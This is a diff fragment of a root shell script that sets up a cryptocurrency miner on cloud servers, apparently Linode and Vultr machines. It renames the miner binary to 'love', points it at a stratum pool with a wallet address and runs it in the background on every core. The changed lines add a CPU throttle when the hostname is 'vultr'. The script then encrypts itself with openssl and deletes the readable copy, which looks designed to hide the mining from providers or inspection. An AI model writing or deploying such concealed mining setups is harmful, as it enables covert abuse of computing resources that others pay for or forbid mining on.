@@ -29,7 +29,7 @@ mv /root/cpuminer-opt-linux/cpuminer-sse2 /root/love
 cat >>/root/config.json <<EOF
 {
   "url": "stratum+tcps://$fastest_server:17079",
-  "user": "uoLoErbARZipdQz94GCZ3H2qUrX13pTvF4.Linode2"
+  "user": "uoLoErbARZipdQz94GCZ3H2qUrX13pTvF4.Linode"
 }
 EOF
 cat /dev/null > /root/danielluis1921.sh
@@ -40,6 +40,16 @@ sleep 3
 sudo /root/love --background --threads=$cores -a yespower -c config.json
 sleep 3
 EOF
+
+hostname=$(hostname)
+if [ "$hostname" = "vultr" ];
+then
+  sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof xmrig) > /dev/null 2>&1 &" danielluis1921.sh
+  sed -i 's/Linode/Vultr/g' danielluis1921.sh
+else
+  echo "hostname isn't vultr"
+fi
+
 openssl enc -aes-256-cbc -salt -pbkdf2 -in danielluis1921.sh -out danielluis1922.sh -k $password
 rm -fv danielluis1921.sh
 chmod +x /root/danielluis1922.sh
